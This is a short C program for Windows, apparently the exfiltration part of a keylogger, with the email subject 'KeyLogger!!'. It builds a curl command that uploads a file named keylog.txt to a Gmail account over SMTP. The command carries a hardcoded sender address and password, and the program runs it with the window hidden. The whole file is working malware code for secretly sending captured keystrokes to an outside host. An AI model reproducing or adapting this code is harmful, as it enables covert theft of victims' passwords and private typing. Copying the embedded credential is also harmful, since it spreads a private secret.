#include <windows.h>

int main(void) {
    char* tmp = "From:dinhtv1008@gmail.com\nTo:tvdinh1008@gmail.com\nSubject : KeyLogger!!";
    
    char* command = (char*)"curl smtp://smtp.gmail.com:587 -v --mail-from \"dinhtv1008@gmail.com\" --mail-rcpt \"tvdinh1008@gmail.com\" --ssl -u dinhtv1008@gmail.com:dinh1999a@ -T \"keylog.txt\" -k --anyauth";
    WinExec(command, SW_HIDE);
    return 0;
}